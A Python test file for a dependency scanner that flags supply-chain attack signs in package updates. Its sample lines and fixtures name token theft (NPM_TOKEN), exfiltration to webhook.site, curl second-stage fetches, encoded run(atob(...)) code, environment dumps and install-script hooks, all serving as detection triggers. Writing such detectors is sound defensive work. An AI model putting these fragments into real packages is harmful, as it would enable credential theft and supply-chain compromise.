"""Tests of the rule-based scan (E-091). Every package here is synthetic, made in a temporary folder by the test itself."""
import ast
import contextlib
import io
import os
import tempfile
import unittest
from pathlib import Path

import dependency_scan as scan

# One line that fires each rule, none of which fires another.
SAMPLES = {
    "token": "const t = process.env.NPM_TOKEN;",
    "secret-scanner": "run('trufflehog filesystem .')",
    "ci-foothold": "write('.github/workflows/x.yml', y)",
    "self-publish": "exec('npm publish --access public')",
    "second-stage": "sh('curl -s https://example.org/a')",
    "exfiltration": "post('https://webhook.site/abc', data)",
    "hidden-code": "run(atob(blob))",
    "env-dump": "send(JSON.stringify(process.env))",
    "jvm-process": "new ProcessBuilder(cmd).start();",
}


def make(root, files):
    for name, content in files.items():
        path = Path(root, name)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(content if isinstance(content, bytes) else content.encode())
    return root


class Case(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.base = Path(self.tmp.name)

    def sides(self, old, new):
        return make(self.base / "old", old), make(self.base / "new", new)

    def run_scan(self, old, new):
        return scan.scan(*self.sides(old, new))

    def rules(self, result):
        return {(h[0], h[1], h[2]) for h in result["hits"]}


class Pairing(Case):
    def test_a_hash_is_taken_out_of_a_chunk_name(self):
        self.assertEqual(scan.unhashed("dist/run.BPv-BBRv.js"), "dist/run.js")
        self.assertEqual(scan.unhashed("chunk-a1b2c3d4.js"), "chunk.js")
        self.assertEqual(scan.unhashed("run.Cx91aQ0e.js"), "run.js")

    def test_a_name_with_no_hash_is_left_alone(self):
        for name in ("lib/index.js", "package.json", "foo.minified.js", "dist/validate.js", "a/b.d.ts"):
            self.assertEqual(scan.unhashed(name), name)

    def test_chunks_are_paired_across_a_rename_and_only_the_change_is_scanned(self):
        old = {"dist/run.BPv-BBRv.js": "a()\nb()\nc()\n", "dist/other.Zk3jQ9aB.js": "x()\n"}
        new = {"dist/run.Cx91aQ0e.js": "a()\nb()\nc()\nrun(atob(x))\n", "dist/other.Pq7wE2nM.js": "x()\n"}
        result = self.run_scan(old, new)
        self.assertEqual(result["pairs"], {"dist/run.BPv-BBRv.js": "dist/run.Cx91aQ0e.js", "dist/other.Zk3jQ9aB.js": "dist/other.Pq7wE2nM.js"})
        self.assertEqual(self.rules(result), {("dist/run.Cx91aQ0e.js", 4, "hidden-code")})

    def test_a_name_that_is_not_unique_on_a_side_is_not_paired(self):
        old = {"dist/run.BPv-BBRv.js": "a()\n"}
        new = {"dist/run.Cx91aQ0e.js": "a()\n", "dist/run.Dy02bR1f.js": "b()\n"}
        self.assertEqual(self.run_scan(old, new)["pairs"], {})

    def test_an_unpaired_new_chunk_is_all_added(self):
        result = self.run_scan({"a.js": "x()\n"}, {"a.js": "x()\n", "dist/new.Cx91aQ0e.js": "run(atob(x))\n"})
        self.assertEqual(self.rules(result), {("dist/new.Cx91aQ0e.js", 1, "hidden-code")})


class Rules(Case):
    def test_each_rule_fires_on_an_added_line_with_its_file_and_line(self):
        for rule, line in SAMPLES.items():
            with self.subTest(rule):
                result = self.run_scan({"lib/a.js": "ok()\n"}, {"lib/a.js": "ok()\n" + line + "\n"})
                self.assertEqual(self.rules(result), {("lib/a.js", 2, rule)})
                self.base_clean()

    def base_clean(self):
        for name in ("old", "new"):
            self.rmtree(self.base / name)

    @staticmethod
    def rmtree(path):
        import shutil
        shutil.rmtree(path, ignore_errors=True)

    def test_a_rule_does_not_fire_on_a_line_both_sides_have(self):
        for rule, line in SAMPLES.items():
            with self.subTest(rule):
                text = "ok()\n" + line + "\n"
                self.assertEqual(self.run_scan({"lib/a.js": text}, {"lib/a.js": text + "more()\n"})["hits"], [])
                self.base_clean()

    def test_a_rule_does_not_fire_on_a_removed_line(self):
        for rule, line in SAMPLES.items():
            with self.subTest(rule):
                self.assertEqual(self.run_scan({"lib/a.js": "ok()\n" + line + "\n"}, {"lib/a.js": "ok()\n"})["hits"], [])
                self.base_clean()

    def test_a_raw_ip_address_fires_and_a_version_string_does_not(self):
        hit = self.run_scan({"a.js": "x\n"}, {"a.js": "x\nconnect('203.0.113.9')\n"})
        self.assertEqual(self.rules(hit), {("a.js", 2, "exfiltration")})
        self.base_clean()
        self.assertEqual(self.run_scan({"a.js": "x\n"}, {"a.js": "x\nconst v = '1.2.3';\n"})["hits"], [])

    def test_a_long_base64_string_fires_and_a_shorter_one_does_not(self):
        self.assertEqual(self.rules(self.run_scan({"a.js": "x\n"}, {"a.js": "x\nk='" + "QUJD" * 50 + "'\n"})), {("a.js", 2, "encoded-string")})
        self.base_clean()
        self.assertEqual(self.run_scan({"a.js": "x\n"}, {"a.js": "x\nk='" + "QUJD" * 49 + "'\n"})["hits"], [])
        self.base_clean()
        self.assertEqual(self.rules(self.run_scan({"a.js": "x\n"}, {"a.js": "x\nk='" + "\\x41" * 40 + "'\n"})), {("a.js", 2, "encoded-string")})

    def test_a_replaced_line_is_an_added_line(self):
        result = self.run_scan({"a.js": "a()\nb()\n"}, {"a.js": "a()\nrun(atob(b))\n"})
        self.assertEqual(self.rules(result), {("a.js", 2, "hidden-code")})

    def test_a_dotted_version_of_five_numbers_is_not_an_address(self):
        self.assertEqual(self.run_scan({"a.js": "x\n"}, {"a.js": "x\nconst v = '1.2.3.4.5';\n"})["hits"], [])

    def test_a_hit_line_names_its_file_line_and_rule(self):
        result = self.run_scan({"a.js": "x\n"}, {"a.js": "x\n" + SAMPLES["token"] + "\n"})
        self.assertIn("HIT a.js:2 [token] ", scan.report(result))
        self.assertIn("scan: 1 hit(s)", scan.report(result))


class Scripts(Case):
    def package(self, scripts):
        return '{\n  "name": "p",\n  "scripts": %s\n}\n' % scripts

    def test_an_added_postinstall_is_a_hit_at_its_line(self):
        result = self.run_scan({"package/package.json": self.package('{"test": "t"}')},
                               {"package/package.json": '{\n  "name": "p",\n  "scripts": {\n    "test": "t",\n    "postinstall": "node x.js"\n  }\n}\n'})
        self.assertEqual(self.rules(result), {("package/package.json", 5, "install-script")})

    def test_a_changed_install_script_is_a_hit_for_each_of_the_four(self):
        for key in scan.LIFECYCLE:
            with self.subTest(key):
                result = self.run_scan({"package.json": self.package('{"%s": "a"}' % key)}, {"package.json": self.package('{"%s": "b"}' % key)})
                self.assertEqual([h[2] for h in result["hits"]], ["install-script"])
                self.assertIn(key, result["hits"][0][3])
                Rules.rmtree(self.base / "old")
                Rules.rmtree(self.base / "new")

    def test_an_unchanged_install_script_and_a_changed_test_script_are_no_hit(self):
        same = self.package('{"postinstall": "a", "test": "x"}')
        self.assertEqual(self.run_scan({"package.json": same}, {"package.json": same.replace('"x"', '"y"')})["hits"], [])

    def test_a_changed_setup_py_is_a_hit(self):
        result = self.run_scan({"setup.py": "x = 1\n"}, {"setup.py": "x = 2\n"})
        self.assertEqual([(h[0], h[2]) for h in result["hits"]], [("setup.py", "python-hook")])

    def test_a_new_package_json_with_a_prepare_script_is_a_hit(self):
        result = self.run_scan({"a.js": "x\n"}, {"a.js": "x\n", "sub/package.json": self.package('{"prepare": "build"}')})
        self.assertEqual([h[2] for h in result["hits"]], ["install-script"])

    def test_a_pth_file_and_a_setup_py_added_are_hits_and_unchanged_ones_are_not(self):
        result = self.run_scan({"keep.pth": "import os\n"}, {"keep.pth": "import os\n", "x.pth": "import os\n", "setup.py": "x = 1\n"})
        self.assertEqual({h[0] for h in result["hits"] if h[2] == "python-hook"}, {"x.pth", "setup.py"})


class Files(Case):
    def test_a_new_large_file_is_a_hit_and_an_old_one_is_not(self):
        big = "line\n" * 30000
        self.assertEqual(self.rules(self.run_scan({"a.js": "x\n"}, {"a.js": "x\n", "data.txt": big})), {("data.txt", 1, "big-file")})
        Rules.rmtree(self.base / "old")
        Rules.rmtree(self.base / "new")
        self.assertEqual(self.run_scan({"data.txt": big}, {"data.txt": big})["hits"], [])

    def test_a_new_minified_file_is_a_hit_and_a_new_short_one_is_not(self):
        minified = "var a=1;" * 300
        self.assertEqual(self.rules(self.run_scan({"a.js": "x\n"}, {"a.js": "x\n", "dist/m.js": minified})), {("dist/m.js", 1, "minified")})
        Rules.rmtree(self.base / "old")
        Rules.rmtree(self.base / "new")
        self.assertEqual(self.run_scan({"a.js": "x\n"}, {"a.js": "x\n", "dist/n.js": "var a = 1;\nvar b = 2;\n"})["hits"], [])

    def test_a_file_of_exactly_100_kb_is_no_hit_and_one_byte_more_is(self):
        self.assertEqual(self.run_scan({"a.js": "x\n"}, {"a.js": "x\n", "d.txt": "a b " * 25600})["hits"], [])
        Rules.rmtree(self.base / "old")
        Rules.rmtree(self.base / "new")
        self.assertEqual(self.rules(self.run_scan({"a.js": "x\n"}, {"a.js": "x\n", "d.txt": "a b " * 25600 + "c"})), {("d.txt", 1, "big-file")})

    def test_a_script_with_one_very_long_line_among_short_ones_is_minified(self):
        text = "var a = 1;\n" * 100 + "var b = 1; " * 130 + "\n"
        self.assertEqual(self.rules(self.run_scan({"a.js": "x\n"}, {"a.js": "x\n", "m.js": text})), {("m.js", 1, "minified")})

    def test_a_script_of_many_long_lines_is_minified_though_none_passes_1000(self):
        text = ("x = 1; " * 35 + "\n") * 20
        self.assertEqual(self.rules(self.run_scan({"a.js": "x\n"}, {"a.js": "x\n", "m.js": text})), {("m.js", 1, "minified")})

    def test_a_binary_file_is_read_as_its_strings_and_only_new_strings_are_added(self):
        old = b"\x00\x01CAFEBABE_class\x00ordinary_string_here\x00"
        new = old + b"\x00\x02run curl http://x.invalid/payload now\x00"
        result = self.run_scan({"A.class": old}, {"A.class": new})
        self.assertEqual([(h[0], h[2]) for h in result["hits"]], [("A.class", "second-stage")])
        self.assertGreater(result["hits"][0][1], len(old) - 1)

    def test_a_binary_string_both_sides_have_is_not_added(self):
        both = b"\x00run curl http://x.invalid/payload now\x00"
        self.assertEqual(self.run_scan({"A.class": both}, {"A.class": both + b"\x00\x03another plain string\x00"})["hits"], [])

    def test_files_diff_lists_added_changed_removed_and_renamed(self):
        result = self.run_scan({"gone.js": "g\n", "same.js": "s\n", "chg.js": "a\n", "d/r.Ab12Cd34.js": "r\n"},
                               {"same.js": "s\n", "chg.js": "b\n", "new.js": "n\n", "d/r.Zy98Xw76.js": "r2\n"})
        self.assertEqual(sorted(result["files.diff"].split("\n")[:-1]),
                         sorted(["A new.js", "M chg.js", "D gone.js", "R d/r.Ab12Cd34.js -> d/r.Zy98Xw76.js"]))
        self.assertIn("+b", result["package.diff"])


class Safety(Case):
    def test_a_symlink_is_a_hit_and_is_never_read_or_walked_into(self):
        outside = self.base / "outside"
        make(outside, {"secret.txt": "NPM_TOKEN=abc\n", "dir/inner.txt": "wget http://x\n"})
        new = make(self.base / "new", {"a.js": "x\n"})
        make(self.base / "old", {"a.js": "x\n"})
        os.symlink(outside / "secret.txt", new / "link.txt")
        os.symlink(outside / "dir", new / "dirlink")
        result = scan.scan(self.base / "old", new)
        self.assertEqual({(h[0], h[2]) for h in result["hits"]}, {("link.txt", "symlink"), ("dirlink", "symlink")})
        self.assertNotIn("secret", result["package.diff"] + result["files.diff"])

    def test_a_symlink_swapped_in_for_a_file_is_not_opened(self):
        outside = self.base / "outside.txt"
        outside.write_text("curl http://x\n")
        old, new = self.sides({"a.js": "x\n"}, {"b.js": "y\n"})
        side = scan.Side(new)
        os.symlink(outside, new / "b.js.link")
        side.files["swapped"] = str(new / "b.js.link")
        self.assertIsNone(side.read("swapped"))

    def test_nothing_in_the_folders_is_executed(self):
        marker = self.base / "ran"
        body = "open(%r, 'w').write('x')\n" % str(marker)
        new = {"package.json": '{"scripts": {"postinstall": "touch %s"}}' % marker, "evil.py": body, "setup.py": body,
               "sitecustomize.py": body, "x.pth": "import os; os.system('touch %s')\n" % marker, "run.sh": "touch %s\n" % marker}
        result = self.run_scan({"a.js": "x\n"}, new)
        self.assertTrue(result["hits"])
        self.assertFalse(marker.exists())

    def test_the_scan_imports_nothing_that_runs_a_process_reaches_the_network_or_loads_code(self):
        tree = ast.parse(Path(scan.__file__).read_text())
        imported = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                imported |= {a.name.split(".")[0] for a in node.names}
            elif isinstance(node, ast.ImportFrom):
                imported.add(node.module.split(".")[0])
        self.assertEqual(imported - {"difflib", "json", "os", "re", "sys", "pathlib"}, set())
        calls = {n.func.id for n in ast.walk(tree) if isinstance(n, ast.Call) and isinstance(n.func, ast.Name)}
        self.assertEqual(calls & {"exec", "eval", "compile", "__import__"}, set())

    def test_a_folder_inside_the_repository_is_refused(self):
        with self.assertRaises(scan.Refused):
            scan.main([str(scan.REPO / "dependency-review"), str(self.base)])
        with self.assertRaises(scan.Refused):
            scan.main([str(self.base), str(self.base), "--out", str(scan.REPO / "build" / "x")])

    def test_a_missing_folder_and_a_wrong_argument_count_are_refused(self):
        with self.assertRaises(scan.Refused):
            scan.main([str(self.base / "nowhere"), str(self.base)])
        with self.assertRaises(scan.Refused):
            scan.main([str(self.base)])


class Command(Case):
    def test_main_writes_the_five_files_and_exits_1_on_a_hit_and_0_on_none(self):
        self.sides({"a.js": "x\n"}, {"a.js": "x\n" + SAMPLES["token"] + "\n"})
        out = self.base / "out"
        with contextlib.redirect_stdout(io.StringIO()):
            code = scan.main([str(self.base / "old"), str(self.base / "new"), "--out", str(out)])
        self.assertEqual(code, 1)
        self.assertEqual(sorted(p.name for p in out.iterdir()), ["files.diff", "package.diff", "pairs.txt", "scan.txt", "scripts.diff"])
        self.assertIn("[token]", (out / "scan.txt").read_text())
        Rules.rmtree(self.base / "new")
        make(self.base / "new", {"a.js": "x\n"})
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(scan.main([str(self.base / "old"), str(self.base / "new")]), 0)


if __name__ == "__main__":
    unittest.main()
